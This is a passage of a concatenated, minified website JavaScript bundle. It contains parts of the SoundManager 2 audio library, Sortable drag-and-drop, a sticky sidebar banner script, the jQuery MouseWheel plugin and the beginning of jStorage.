            8 !== m && 9 !== m && (c.flashVersion = m = 8);
            var b = c.debugMode || c.debugFlash ? "_debug.swf" : ".swf";
            c.useHTML5Audio && !c.html5Only && c.audioFormats.mp4.required && 9 > m && (c.flashVersion = m = 9);
            c.version = c.versionNumber + (c.html5Only ? " (HTML5-only mode)" : 9 === m ? " (AS3/Flash 9)" : " (AS2/Flash 8)");
            8 < m ? (c.defaultOptions = x(c.defaultOptions, c.flash9Options), c.features.buffering = !0, c.defaultOptions = x(c.defaultOptions, c.movieStarOptions), c.filePatterns.flash9 =
                new RegExp("\\.(mp3|" + fb.join("|") + ")(\\?.*)?$", "i"), c.features.movieStar = !0) : c.features.movieStar = !1;
            c.filePattern = c.filePatterns[8 !== m ? "flash9" : "flash8"];
            c.movieURL = (8 === m ? "soundmanager2.swf" : "soundmanager2_flash9.swf").replace(".swf", b);
            c.features.peakData = c.features.waveformData = c.features.eqData = 8 < m
        };
        Sa = function(b, c) {
            if (!k) return !1;
            k._setPolling(b, c)
        };
        ya = function() {};
        q = this.getSoundById;
        L = function() {
            var b = [];
            c.debugMode && b.push("sm2_debug");
            c.debugFlash && b.push("flash_debug");
            c.useHighPerformance &&
            b.push("high_performance");
            return b.join(" ")
        };
        Ba = function() {
            T("fbHandler");
            var b = c.getMoviePercent(),
                e = {
                    type: "FLASHBLOCK"
                };
            if (c.html5Only) return !1;
            c.ok() ? c.oMC && (c.oMC.className = [L(), "movieContainer", "swf_loaded" + (c.didFlashBlock ? " swf_unblocked" : "")].join(" ")) : (v && (c.oMC.className = L() + " movieContainer " + (null === b ? "swf_timedout" : "swf_error")), c.didFlashBlock = !0, F({
                type: "ontimeout",
                ignoreInit: !0,
                error: e
            }), K(e))
        };
        ta = function(b, c, d) {
            y[b] === g && (y[b] = []);
            y[b].push({
                method: c,
                scope: d || null,
                fired: !1
            })
        };
        F = function(b) {
            b || (b = {
                type: c.ok() ? "onready" : "ontimeout"
            });
            if (!l && b && !b.ignoreInit || "ontimeout" === b.type && (c.ok() || B && !b.ignoreInit)) return !1;
            var e = {
                    success: b && b.ignoreInit ? c.ok() : !B
                },
                d = b && b.type ? y[b.type] || [] : [],
                a = [],
                f, e = [e],
                g = v && !c.ok();
            b.error && (e[0].error = b.error);
            b = 0;
            for (f = d.length; b < f; b++) !0 !== d[b].fired && a.push(d[b]);
            if (a.length)
                for (b = 0, f = a.length; b < f; b++) a[b].scope ? a[b].method.apply(a[b].scope, e) : a[b].method.apply(this, e), g || (a[b].fired = !0);
            return !0
        };
        H = function() {
            h.setTimeout(function() {
                c.useFlashBlock &&
                Ba();
                F();
                "function" === typeof c.onload && c.onload.apply(h);
                c.waitForWindowLoad && t.add(h, "load", H)
            }, 1)
        };
        Fa = function() {
            if (A !== g) return A;
            var b = !1,
                c = navigator,
                d = c.plugins,
                a, f = h.ActiveXObject;
            if (d && d.length)(c = c.mimeTypes) && c["application/x-shockwave-flash"] && c["application/x-shockwave-flash"].enabledPlugin && c["application/x-shockwave-flash"].enabledPlugin.description && (b = !0);
            else if (f !== g && !u.match(/MSAppHost/i)) {
                try {
                    a = new f("ShockwaveFlash.ShockwaveFlash")
                } catch (n) {
                    a = null
                }
                b = !!a
            }
            return A = b
        };
        Ya = function() {
            var b,
                e, d = c.audioFormats;
            Ha && u.match(/os (1|2|3_0|3_1)\s/i) ? (c.hasHTML5 = !1, c.html5Only = !0, c.oMC && (c.oMC.style.display = "none")) : !c.useHTML5Audio || c.html5 && c.html5.canPlayType || (c.hasHTML5 = !1);
            if (c.useHTML5Audio && c.hasHTML5)
                for (e in X = !0, d) d.hasOwnProperty(e) && d[e].required && (c.html5.canPlayType(d[e].type) ? c.preferFlash && (c.flash[e] || c.flash[d[e].type]) && (b = !0) : (X = !1, b = !0));
            c.ignoreFlash && (b = !1, X = !0);
            c.html5Only = c.hasHTML5 && c.useHTML5Audio && !b;
            return !c.html5Only
        };
        ia = function(b) {
            var e, d, a = 0;
            if (b instanceof Array) {
                e = 0;
                for (d = b.length; e < d; e++)
                    if (b[e] instanceof Object) {
                        if (c.canPlayMIME(b[e].type)) {
                            a = e;
                            break
                        }
                    } else if (c.canPlayURL(b[e])) {
                        a = e;
                        break
                    }
                b[a].url && (b[a] = b[a].url);
                b = b[a]
            }
            return b
        };
        Va = function(b) {
            b._hasTimer || (b._hasTimer = !0, !na && c.html5PollingInterval && (null === V && 0 === ha && (V = setInterval(Xa, c.html5PollingInterval)), ha++))
        };
        Wa = function(b) {
            b._hasTimer && (b._hasTimer = !1, !na && c.html5PollingInterval && ha--)
        };
        Xa = function() {
            var b;
            if (null !== V && !ha) return clearInterval(V), V = null, !1;
            for (b = c.soundIDs.length - 1; 0 <=
            b; b--) c.sounds[c.soundIDs[b]].isHTML5 && c.sounds[c.soundIDs[b]]._hasTimer && c.sounds[c.soundIDs[b]]._onTimer()
        };
        K = function(b) {
            b = b !== g ? b : {};
            "function" === typeof c.onerror && c.onerror.apply(h, [{
                type: b.type !== g ? b.type : null
            }]);
            b.fatal !== g && b.fatal && c.disable()
        };
        $a = function() {
            if (!bb || !Fa()) return !1;
            var b = c.audioFormats,
                e, d;
            for (d in b)
                if (b.hasOwnProperty(d) && ("mp3" === d || "mp4" === d) && (c.html5[d] = !1, b[d] && b[d].related))
                    for (e = b[d].related.length - 1; 0 <= e; e--) c.html5[b[d].related[e]] = !1
        };
        this._setSandboxType = function(b) {};
        this._externalInterfaceOK = function(b) {
            if (c.swfLoaded) return !1;
            c.swfLoaded = !0;
            oa = !1;
            bb && $a();
            setTimeout(qa, E ? 100 : 1)
        };
        ea = function(b, e) {
            function d(a, b) {
                return '<param name="' + a + '" value="' + b + '" />'
            }
            if (O && P) return !1;
            if (c.html5Only) return va(), c.oMC = aa(c.movieID), qa(), P = O = !0, !1;
            var a = e || c.url,
                f = c.altURL || a,
                h = xa(),
                k = L(),
                m = null,
                m = p.getElementsByTagName("html")[0],
                l, r, q, m = m && m.dir && m.dir.match(/rtl/i);
            b = b === g ? c.id : b;
            va();
            c.url = Ua(La ? a : f);
            e = c.url;
            c.wmode = !c.wmode && c.useHighPerformance ? "transparent" : c.wmode;
            null !== c.wmode && (u.match(/msie 8/i) || !E && !c.useHighPerformance) && navigator.platform.match(/win32|win64/i) && (W.push(J.spcWmode), c.wmode = null);
            h = {
                name: b,
                id: b,
                src: e,
                quality: "high",
                allowScriptAccess: c.allowScriptAccess,
                bgcolor: c.bgColor,
                pluginspage: jb + "www.macromedia.com/go/getflashplayer",
                title: "JS/Flash audio component (SoundManager 2)",
                type: "application/x-shockwave-flash",
                wmode: c.wmode,
                hasPriority: "true"
            };
            c.debugFlash && (h.FlashVars = "debug=1");
            c.wmode || delete h.wmode;
            if (E) a = p.createElement("div"), r = ['<object id="' + b + '" data="' + e + '" type="' + h.type + '" title="' + h.title + '" classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,40,0">', d("movie", e), d("AllowScriptAccess", c.allowScriptAccess), d("quality", h.quality), c.wmode ? d("wmode", c.wmode) : "", d("bgcolor", c.bgColor), d("hasPriority", "true"), c.debugFlash ? d("FlashVars", h.FlashVars) : "", "</object>"].join("");
            else
                for (l in a = p.createElement("embed"), h) h.hasOwnProperty(l) &&
                a.setAttribute(l, h[l]);
            ya();
            k = L();
            if (h = xa())
                if (c.oMC = aa(c.movieID) || p.createElement("div"), c.oMC.id) q = c.oMC.className, c.oMC.className = (q ? q + " " : "movieContainer") + (k ? " " + k : ""), c.oMC.appendChild(a), E && (l = c.oMC.appendChild(p.createElement("div")), l.className = "sm2-object-box", l.innerHTML = r), P = !0;
                else {
                    c.oMC.id = c.movieID;
                    c.oMC.className = "movieContainer " + k;
                    l = k = null;
                    c.useFlashBlock || (c.useHighPerformance ? k = {
                        position: "fixed",
                        width: "8px",
                        height: "8px",
                        bottom: "0px",
                        left: "0px",
                        overflow: "hidden"
                    } : (k = {
                        position: "absolute",
                        width: "6px",
                        height: "6px",
                        top: "-9999px",
                        left: "-9999px"
                    }, m && (k.left = Math.abs(parseInt(k.left, 10)) + "px")));
                    ib && (c.oMC.style.zIndex = 1E4);
                    if (!c.debugFlash)
                        for (q in k) k.hasOwnProperty(q) && (c.oMC.style[q] = k[q]);
                    try {
                        E || c.oMC.appendChild(a), h.appendChild(c.oMC), E && (l = c.oMC.appendChild(p.createElement("div")), l.className = "sm2-object-box", l.innerHTML = r), P = !0
                    } catch (t) {
                        throw Error(T("domError") + " \n" + t.toString());
                    }
                }
            return O = !0
        };
        da = function() {
            if (c.html5Only) return ea(), !1;
            if (k || !c.url) return !1;
            k = c.getMovie(c.id);
            k || (S ? (E ? c.oMC.innerHTML = Aa : c.oMC.appendChild(S), S = null, O = !0) : ea(c.id, c.url), k = c.getMovie(c.id));
            "function" === typeof c.oninitmovie && setTimeout(c.oninitmovie, 1);
            return !0
        };
        I = function() {
            setTimeout(Ra, 1E3)
        };
        ua = function() {
            h.setTimeout(function() {
                c.setup({
                    preferFlash: !1
                }).reboot();
                c.didFlashBlock = !0;
                c.beginDelayedInit()
            }, 1)
        };
        Ra = function() {
            var b, e = !1;
            if (!c.url || U) return !1;
            U = !0;
            t.remove(h, "load", I);
            if (A && oa && !Ka) return !1;
            l || (b = c.getMoviePercent(), 0 < b && 100 > b && (e = !0));
            setTimeout(function() {
                b = c.getMoviePercent();
                if (e) return U = !1, h.setTimeout(I, 1), !1;
                !l && cb && (null === b ? c.useFlashBlock || 0 === c.flashLoadTimeout ? c.useFlashBlock && Ba() : !c.useFlashBlock && X ? ua() : F({
                    type: "ontimeout",
                    ignoreInit: !0,
                    error: {
                        type: "INIT_FLASHBLOCK"
                    }
                }) : 0 !== c.flashLoadTimeout && (!c.useFlashBlock && X ? ua() : za(!0)))
            }, c.flashLoadTimeout)
        };
        ca = function() {
            if (Ka || !oa) return t.remove(h, "focus", ca), !0;
            Ka = cb = !0;
            U = !1;
            I();
            t.remove(h, "focus", ca);
            return !0
        };
        Q = function(b) {
            if (l) return !1;
            if (c.html5Only) return l = !0, H(), !0;
            var e = !0,
                d;
            c.useFlashBlock && c.flashLoadTimeout &&
            !c.getMoviePercent() || (l = !0);
            d = {
                type: !A && v ? "NO_FLASH" : "INIT_TIMEOUT"
            };
            if (B || b) c.useFlashBlock && c.oMC && (c.oMC.className = L() + " " + (null === c.getMoviePercent() ? "swf_timedout" : "swf_error")), F({
                type: "ontimeout",
                error: d,
                ignoreInit: !0
            }), K(d), e = !1;
            B || (c.waitForWindowLoad && !ra ? t.add(h, "load", H) : H());
            return e
        };
        Qa = function() {
            var b, e = c.setupOptions;
            for (b in e) e.hasOwnProperty(b) && (c[b] === g ? c[b] = e[b] : c[b] !== e[b] && (c.setupOptions[b] = c[b]))
        };
        qa = function() {
            if (l) return !1;
            if (c.html5Only) return l || (t.remove(h, "load",
                c.beginDelayedInit), c.enabled = !0, Q()), !0;
            da();
            try {
                k._externalInterfaceTest(!1), Sa(!0, c.flashPollingInterval || (c.useHighPerformance ? 10 : 50)), c.debugMode || k._disableDebug(), c.enabled = !0, c.html5Only || t.add(h, "unload", pa)
            } catch (b) {
                return K({
                    type: "JS_TO_FLASH_EXCEPTION",
                    fatal: !0
                }), za(!0), Q(), !1
            }
            Q();
            t.remove(h, "load", c.beginDelayedInit);
            return !0
        };
        G = function() {
            if (R) return !1;
            R = !0;
            Qa();
            ya();
            !A && c.hasHTML5 && c.setup({
                useHTML5Audio: !0,
                preferFlash: !1
            });
            Za();
            !A && v && (W.push(J.needFlash), c.setup({
                flashLoadTimeout: 1
            }));
            p.removeEventListener && p.removeEventListener("DOMContentLoaded", G, !1);
            da();
            return !0
        };
        Da = function() {
            "complete" === p.readyState && (G(), p.detachEvent("onreadystatechange", Da));
            return !0
        };
        wa = function() {
            ra = !0;
            G();
            t.remove(h, "load", wa)
        };
        Fa();
        t.add(h, "focus", ca);
        t.add(h, "load", I);
        t.add(h, "load", wa);
        p.addEventListener ? p.addEventListener("DOMContentLoaded", G, !1) : p.attachEvent ? p.attachEvent("onreadystatechange", Da) : K({
            type: "NO_DOM2_EVENTS",
            fatal: !0
        })
    }
    if (!h || !h.document) throw Error("SoundManager requires a browser with window and document objects.");
    var N = null;
    h.SM2_DEFER !== g && SM2_DEFER || (N = new w);
    "object" === typeof module && module && "object" === typeof module.exports ? (module.exports.SoundManager = w, module.exports.soundManager = N) : "function" === typeof define && define.amd && define(function() {
        return {
            constructor: w,
            getInstance: function(g) {
                !h.soundManager && g instanceof Function && (g = g(w), g instanceof w && (h.soundManager = g));
                return h.soundManager
            }
        }
    });
    h.SoundManager = w;
    h.soundManager = N
})(window);
/*! Sortable 0.5.0 - MIT | git://github.com/rubaxa/Sortable.git */
(function(factory) {
    "use strict";
    if (typeof define === "function" && define.amd) {
        define(factory);
    } else if (typeof module != "undefined" && typeof module.exports != "undefined") {
        module.exports = factory();
    } else {
        window["Sortable"] = factory();
    }
})(function() {
    "use strict";
    var
        dragEl, ghostEl, rootEl, nextEl, lastEl, lastCSS, lastRect, activeGroup, tapEvt, touchEvt, expando = 'Sortable' + (new Date).getTime(),
        win = window,
        document = win.document,
        parseInt = win.parseInt,
        supportIEdnd = !!document.createElement('div').dragDrop,
        _silent = false,
        _createEvent = function(event, item) {
            var evt = document.createEvent('Event');
            evt.initEvent(event, true, true);
            evt.item = item;
            return evt;
        },
        _dispatchEvent = function(rootEl, name, targetEl) {
            rootEl.dispatchEvent(_createEvent(name, targetEl || rootEl));
        },
        _customEvents = 'onAdd onUpdate onRemove onStart onEnd onFilter'.split(' '),
        noop = function() {},
        slice = [].slice,
        touchDragOverListeners = [];

    function Sortable(el, options) {
        this.el = el;
        this.options = options = (options || {});
        var defaults = {
            group: Math.random(),
            store: null,
            handle: null,
            draggable: el.children[0] && el.children[0].nodeName || (/[uo]l/i.test(el.nodeName) ? 'li' : '*'),
            ghostClass: 'sortable-ghost',
            ignore: 'a, img',
            filter: null
        };
        for (var name in defaults) {
            options[name] = options[name] || defaults[name];
        }
        _customEvents.forEach(function(name) {
            options[name] = _bind(this, options[name] || noop);
            _on(el, name.substr(2).toLowerCase(), options[name]);
        });
        el[expando] = options.group;
        for (var fn in this) {
            if (fn.charAt(0) === '_') {
                this[fn] = _bind(this, this[fn]);
            }
        }
        _on(el, 'mousedown', this._onTapStart);
        _on(el, 'touchstart', this._onTapStart);
        supportIEdnd && _on(el, 'selectstart', this._onTapStart);
        _on(el, 'dragover', this._onDragOver);
        _on(el, 'dragenter', this._onDragOver);
        touchDragOverListeners.push(this._onDragOver);
        options.store && this.sort(options.store.get(this));
    }
    Sortable.prototype = {
        constructor: Sortable,
        _applyEffects: function() {
            _toggleClass(dragEl, this.options.ghostClass, true);
        },
        _onTapStart: function(evt) {
            var
                touch = evt.touches && evt.touches[0],
                target = (touch || evt).target,
                options = this.options,
                el = this.el,
                filter = options.filter;
            if (typeof filter === 'function' && filter.call(this, target, this)) {
                _dispatchEvent(el, 'filter', target);
                return;
            } else if (filter) {
                filter = filter.split(',').filter(function(criteria) {
                    return _closest(target, criteria.trim(), el);
                });
                if (filter.length) {
                    _dispatchEvent(el, 'filter', target);
                    return;
                }
            }
            if (options.handle) {
                target = _closest(target, options.handle, el);
            }
            target = _closest(target, options.draggable, el);
            if (target && evt.type == 'selectstart') {
                if (target.tagName != 'A' && target.tagName != 'IMG') {
                    target.dragDrop();
                }
            }
            if (target && !dragEl && (target.parentNode === el)) {
                tapEvt = evt;
                rootEl = this.el;
                dragEl = target;
                nextEl = dragEl.nextSibling;
                activeGroup = this.options.group;
                dragEl.draggable = true;
                options.ignore.split(',').forEach(function(criteria) {
                    _find(target, criteria.trim(), _disableDraggable);
                });
                if (touch) {
                    tapEvt = {
                        target: target,
                        clientX: touch.clientX,
                        clientY: touch.clientY
                    };
                    this._onDragStart(tapEvt, true);
                    evt.preventDefault();
                }
                _on(document, 'mouseup', this._onDrop);
                _on(document, 'touchend', this._onDrop);
                _on(document, 'touchcancel', this._onDrop);
                _on(this.el, 'dragstart', this._onDragStart);
                _on(this.el, 'dragend', this._onDrop);
                _on(document, 'dragover', _globalDragOver);
                try {
                    if (document.selection) {
                        document.selection.empty();
                    } else {
                        window.getSelection().removeAllRanges()
                    }
                } catch (err) {}
                _dispatchEvent(dragEl, 'start');
            }
        },
        _emulateDragOver: function() {
            if (touchEvt) {
                _css(ghostEl, 'display', 'none');
                var
                    target = document.elementFromPoint(touchEvt.clientX, touchEvt.clientY),
                    parent = target,
                    group = this.options.group,
                    i = touchDragOverListeners.length;
                if (parent) {
                    do {
                        if (parent[expando] === group) {
                            while (i--) {
                                touchDragOverListeners[i]({
                                    clientX: touchEvt.clientX,
                                    clientY: touchEvt.clientY,
                                    target: target,
                                    rootEl: parent
                                });
                            }
                            break;
                        }
                        target = parent;
                    }
                    while (parent = parent.parentNode);
                }
                _css(ghostEl, 'display', '');
            }
        },
        _onTouchMove: function(evt) {
            if (tapEvt) {
                var
                    touch = evt.touches[0],
                    dx = touch.clientX - tapEvt.clientX,
                    dy = touch.clientY - tapEvt.clientY,
                    translate3d = 'translate3d(' + dx + 'px,' + dy + 'px,0)';
                touchEvt = touch;
                _css(ghostEl, 'webkitTransform', translate3d);
                _css(ghostEl, 'mozTransform', translate3d);
                _css(ghostEl, 'msTransform', translate3d);
                _css(ghostEl, 'transform', translate3d);
                evt.preventDefault();
            }
        },
        _onDragStart: function(evt, isTouch) {
            var dataTransfer = evt.dataTransfer;
            this._offUpEvents();
            if (isTouch) {
                var
                    rect = dragEl.getBoundingClientRect(),
                    css = _css(dragEl),
                    ghostRect;
                ghostEl = dragEl.cloneNode(true);
                _css(ghostEl, 'top', rect.top - parseInt(css.marginTop, 10));
                _css(ghostEl, 'left', rect.left - parseInt(css.marginLeft, 10));
                _css(ghostEl, 'width', rect.width);
                _css(ghostEl, 'height', rect.height);
                _css(ghostEl, 'opacity', '0.8');
                _css(ghostEl, 'position', 'fixed');
                _css(ghostEl, 'zIndex', '100000');
                rootEl.appendChild(ghostEl);
                ghostRect = ghostEl.getBoundingClientRect();
                _css(ghostEl, 'width', rect.width * 2 - ghostRect.width);
                _css(ghostEl, 'height', rect.height * 2 - ghostRect.height);
                _on(document, 'touchmove', this._onTouchMove);
                _on(document, 'touchend', this._onDrop);
                _on(document, 'touchcancel', this._onDrop);
                this._loopId = setInterval(this._emulateDragOver, 150);
            } else {
                dataTransfer.effectAllowed = 'move';
                dataTransfer.setData('Text', dragEl.textContent);
                _on(document, 'drop', this._onDrop);
            }
            setTimeout(this._applyEffects);
        },
        _onDragOver: function(evt) {
            if (!window.sortableLastTime) {
                window.sortableLastTime = new Date().getTime();
            }
            var delay = 50;
            var currentTime = new Date().getTime();
            if (currentTime - sortableLastTime >= delay) {
                sortableLastTime = currentTime;
                if (!_silent && (activeGroup === this.options.group) && (evt.rootEl === void 0 || evt.rootEl === this.el)) {
                    var
                        el = this.el,
                        target = _closest(evt.target, this.options.draggable, el);
                    if (el.children.length === 0 || el.children[0] === ghostEl || (el === evt.target) && _ghostInBottom(el, evt)) {
                        el.appendChild(dragEl);
                    } else if (target && target !== dragEl && (target.parentNode[expando] !== void 0)) {
                        if (lastEl !== target) {
                            lastEl = target;
                            lastCSS = _css(target);
                            lastRect = target.getBoundingClientRect();
                        }
                        var
                            rect = lastRect,
                            width = rect.right - rect.left,
                            height = rect.bottom - rect.top,
                            floating = /left|right|inline/.test(lastCSS.cssFloat + lastCSS.display),
                            isWide = (target.offsetWidth > dragEl.offsetWidth),
                            isLong = (target.offsetHeight > dragEl.offsetHeight),
                            halfway = (floating ? (evt.clientX - rect.left) / width : (evt.clientY - rect.top) / height) > .5,
                            nextSibling = target.nextElementSibling,
                            after;
                        _silent = true;
                        setTimeout(_unsilent, 30);
                        if (floating) {
                            after = (target.previousElementSibling === dragEl) && !isWide || halfway && isWide
                        } else {
                            after = (nextSibling !== dragEl) && !isLong || halfway && isLong;
                        }
                        if (after && !nextSibling) {
                            el.appendChild(dragEl);
                        } else {
                            target.parentNode.insertBefore(dragEl, after ? nextSibling : target);
                        }
                        var elBottomPosition = rect.bottom,
                            elMaxBottomPosition = this.el.clientHeight,
                            delta = 15;
                        var rangeMin = elMaxBottomPosition - delta,
                            rangeMax = elMaxBottomPosition + delta;
                        if (elBottomPosition >= rangeMin && elBottomPosition <= rangeMax) {
                            this.el.scrollTop = this.el.scrollTop + height;
                        }
                        if (rect.top < delta + 10) {
                            if (this.el.scrollTop > 0)
                                this.el.scrollTop = this.el.scrollTop - height;
                        }
                    }
                }
            }
        },
        _offUpEvents: function() {
            _off(document, 'mouseup', this._onDrop);
            _off(document, 'touchmove', this._onTouchMove);
            _off(document, 'touchend', this._onDrop);
            _off(document, 'touchcancel', this._onDrop);
        },
        _onDrop: function(evt) {
            clearInterval(this._loopId);
            _off(document, 'drop', this._onDrop);
            _off(document, 'dragover', _globalDragOver);
            _off(this.el, 'dragend', this._onDrop);
            _off(this.el, 'dragstart', this._onDragStart);
            _off(this.el, 'selectstart', this._onTapStart);
            this._offUpEvents();
            if (evt) {
                evt.preventDefault();
                evt.stopPropagation();
                if (ghostEl) {
                    ghostEl.parentNode.removeChild(ghostEl);
                }
                if (dragEl) {
                    _disableDraggable(dragEl);
                    _toggleClass(dragEl, this.options.ghostClass, false);
                    if (!rootEl.contains(dragEl)) {
                        _dispatchEvent(rootEl, 'remove', dragEl);
                        _dispatchEvent(dragEl, 'add');
                    } else if (dragEl.nextSibling !== nextEl) {
                        _dispatchEvent(dragEl, 'update');
                    }
                    _dispatchEvent(dragEl, 'end');
                }
                rootEl = dragEl = ghostEl = nextEl = tapEvt = touchEvt = lastEl = lastCSS = activeGroup = null;
                this.options.store && this.options.store.set(this);
            }
        },
        toArray: function() {
            var order = [],
                el, children = this.el.children,
                i = 0,
                n = children.length;
            for (; i < n; i++) {
                el = children[i];
                order.push(el.getAttribute('data-id') || _generateId(el));
            }
            return order;
        },
        sort: function(order) {
            var items = {},
                el = this.el;
            this.toArray().forEach(function(id, i) {
                items[id] = el.children[i];
            });
            order.forEach(function(id) {
                if (items[id]) {
                    el.removeChild(items[id]);
                    el.appendChild(items[id]);
                }
            });
        },
        closest: function(el, selector) {
            return _closest(el, selector || this.options.draggable, this.el);
        },
        destroy: function() {
            var el = this.el,
                options = this.options;
            _customEvents.forEach(function(name) {
                _off(el, name.substr(2).toLowerCase(), options[name]);
            });
            _off(el, 'mousedown', this._onTapStart);
            _off(el, 'touchstart', this._onTapStart);
            _off(el, 'selectstart', this._onTapStart);
            _off(el, 'dragover', this._onDragOver);
            _off(el, 'dragenter', this._onDragOver);
            Array.prototype.forEach.call(el.querySelectorAll('[draggable]'), function(el) {
                el.removeAttribute('draggable');
            });
            touchDragOverListeners.splice(touchDragOverListeners.indexOf(this._onDragOver), 1);
            this._onDrop();
            this.el = null;
        }
    };

    function _bind(ctx, fn) {
        var args = slice.call(arguments, 2);
        return fn.bind ? fn.bind.apply(fn, [ctx].concat(args)) : function() {
            return fn.apply(ctx, args.concat(slice.call(arguments)));
        };
    }

    function _closest(el, selector, ctx) {
        if (selector === '*') {
            return el;
        } else if (el) {
            ctx = ctx || document;
            selector = selector.split('.');
            var
                tag = selector.shift().toUpperCase(),
                re = new RegExp('\\s(' + selector.join('|') + ')\\s', 'g');
            do {
                if ((tag === '' || el.nodeName == tag) && (!selector.length || ((' ' + el.className + ' ').match(re) || []).length == selector.length)) {
                    return el;
                }
            }
            while (el !== ctx && (el = el.parentNode));
        }
        return null;
    }

    function _globalDragOver(evt) {
        evt.dataTransfer.dropEffect = 'move';
        evt.preventDefault();
    }

    function _on(el, event, fn) {
        el.addEventListener(event, fn, false);
    }

    function _off(el, event, fn) {
        el.removeEventListener(event, fn, false);
    }

    function _toggleClass(el, name, state) {
        if (el) {
            if (el.classList) {
                el.classList[state ? 'add' : 'remove'](name);
            } else {
                var className = (' ' + el.className + ' ').replace(/\s+/g, ' ').replace(' ' + name + ' ', '');
                el.className = className + (state ? ' ' + name : '')
            }
        }
    }

    function _css(el, prop, val) {
        if (el && el.style) {
            if (val === void 0) {
                if (document.defaultView && document.defaultView.getComputedStyle) {
                    val = document.defaultView.getComputedStyle(el, '');
                } else if (el.currentStyle) {
                    val = el.currentStyle;
                }
                return prop === void 0 ? val : val[prop];
            } else {
                el.style[prop] = val + (typeof val === 'string' ? '' : 'px');
            }
        }
    }

    function _find(ctx, tagName, iterator) {
        if (ctx) {
            var list = ctx.getElementsByTagName(tagName),
                i = 0,
                n = list.length;
            if (iterator) {
                for (; i < n; i++) {
                    iterator(list[i], i);
                }
            }
            return list;
        }
        return [];
    }

    function _disableDraggable(el) {
        return el.draggable = false;
    }

    function _unsilent() {
        _silent = false;
    }

    function _ghostInBottom(el, evt) {
        var last = el.lastElementChild.getBoundingClientRect();
        return evt.clientY - (last.top + last.height) > 5;
    }

    function _generateId(el) {
        var str = el.tagName + el.className + el.src + el.href + el.textContent,
            i = str.length,
            sum = 0;
        while (i--) {
            sum += str.charCodeAt(i);
        }
        return sum.toString(36);
    }
    Sortable.utils = {
        on: _on,
        off: _off,
        css: _css,
        find: _find,
        bind: _bind,
        closest: _closest,
        toggleClass: _toggleClass,
        createEvent: _createEvent,
        dispatchEvent: _dispatchEvent
    };
    Sortable.version = '0.5.0';
    return Sortable;
});
$(function() {
    var blockFloatIfWidthMoreThan = 768;
    var windowTopOffset = 70;

    function floater_block() {
        var floaterWrapper = $('#stickyblock');
        if (!floaterWrapper.length) {
            return;
        }
        var floatedBlock = $('#stickyblockBanner');
        var asideHeight = $('#xbody-side1').height();
        var parent = $('#xbody-content');
        var parentHeight = parent.height();
        if ($(document).width() > blockFloatIfWidthMoreThan && parentHeight > asideHeight) {
            var floatedBlockHeight = floatedBlock.height();
            var currentOffset = $(window).scrollTop();
            var minPosition = floaterWrapper.offset().top - windowTopOffset;
            var maxPosition = parent.offset().top + parentHeight - floatedBlockHeight - windowTopOffset;
            if (currentOffset >= minPosition) {
                if (currentOffset >= maxPosition) {
                    floatedBlock.css({
                        'position': 'static'
                    });
                    floaterWrapper.css({
                        'position': 'absolute',
                        'bottom': '0'
                    });
                } else {
                    floaterWrapper.css({
                        'position': 'static'
                    });
                    floatedBlock.css({
                        'position': 'fixed',
                        'top': windowTopOffset + "px"
                    });
                }
            } else {
                floaterWrapper.css({
                    'position': 'static'
                });
                floatedBlock.css({
                    'position': 'static'
                });
            }
        } else {
            floaterWrapper.css({
                'position': 'static'
            });
            floatedBlock.css({
                'position': 'static'
            });
        }
    }
    $(window).on('resize scroll load', floater_block);
});
/*! MouseWheel
 * Copyright (c) 2011 Brandon Aaron (http://brandonaaron.net)
 * Licensed under the MIT License (LICENSE.txt).
 *
 * Thanks to: http://adomas.org/javascript-mouse-wheel/ for some pointers.
 * Thanks to: Mathias Bank(http://www.mathias-bank.de) for a scope bug fix.
 * Thanks to: Seamus Leahy for adding deltaX and deltaY
 *
 * Version: 3.0.6
 *
 * Requires: 1.2.2+
 */
(function(a) {
    function d(b) {
        var c = b || window.event,
            d = [].slice.call(arguments, 1),
            e = 0,
            f = true,
            g = 0,
            h = 0;
        b = a.event.fix(c);
        b.type = "mousewheel";
        if (c.wheelDelta) {
            e = c.wheelDelta / 120
        }
        if (c.detail) {
            e = -c.detail / 3
        }
        h = e;
        if (c.axis !== undefined && c.axis === c.HORIZONTAL_AXIS) {
            h = 0;
            g = -1 * e
        }
        if (c.wheelDeltaY !== undefined) {
            h = c.wheelDeltaY / 120
        }
        if (c.wheelDeltaX !== undefined) {
            g = -1 * c.wheelDeltaX / 120
        }
        d.unshift(b, e, g, h);
        return (a.event.dispatch || a.event.handle).apply(this, d)
    }
    var b = ["DOMMouseScroll", "mousewheel"];
    if (a.event.fixHooks) {
        for (var c = b.length; c;) {
            a.event.fixHooks[b[--c]] = a.event.mouseHooks
        }
    }
    a.event.special.mousewheel = {
        setup: function() {
            if (this.addEventListener) {
                for (var a = b.length; a;) {
                    this.addEventListener(b[--a], d, false)
                }
            } else {
                this.onmousewheel = d
            }
        },
        teardown: function() {
            if (this.removeEventListener) {
                for (var a = b.length; a;) {
                    this.removeEventListener(b[--a], d, false)
                }
            } else {
                this.onmousewheel = null
            }
        }
    };
    a.fn.extend({
        mousewheel: function(a) {
            return a ? this.bind("mousewheel", a) : this.trigger("mousewheel")
        },
        unmousewheel: function(a) {
            return this.unbind("mousewheel", a)
        }
    })
})(jQuery);
/* JSTORAGE
 * Simple local storage wrapper to save data on the browser side, supporting
 * all major browsers - IE6+, Firefox2+, Safari4+, Chrome4+ and Opera 10.5+
 *
 * Author: Andris Reinman, andris.reinman@gmail.com
 * Project homepage: www.jstorage.info
 *
 * Bumped version to 0.4.12
 */

(function() {
    function C() {
        var a = "{}";
        if ("userDataBehavior" == f) {
            g.load("jStorage");
            try {
                a = g.getAttribute("jStorage")
            } catch (b) {}
            try {
                r = g.getAttribute("jStorage_update")
            } catch (c) {}
            h.jStorage = a
        }
        D();
        x();
        E()
    }

    function u() {
        var a;
        clearTimeout(F);
        F = setTimeout(function() {
            if ("localStorage" == f || "globalStorage" == f) a = h.jStorage_update;
            else if ("userDataBehavior" == f) {
                g.load("jStorage");
                try {
                    a = g.getAttribute("jStorage_update")
                } catch (b) {}
            }
            if (a && a != r) {
                r = a;
                var l = p.parse(p.stringify(c.__jstorage_meta.CRC32)),
                    k;
                C();
                k = p.parse(p.stringify(c.__jstorage_meta.CRC32));
                var d, n = [],
                    e = [];
                for (d in l) l.hasOwnProperty(d) && (k[d] ? l[d] != k[d] && "2." == String(l[d]).substr(0, 2) && n.push(d) : e.push(d));
                for (d in k) k.hasOwnProperty(d) && (l[d] || n.push(d));
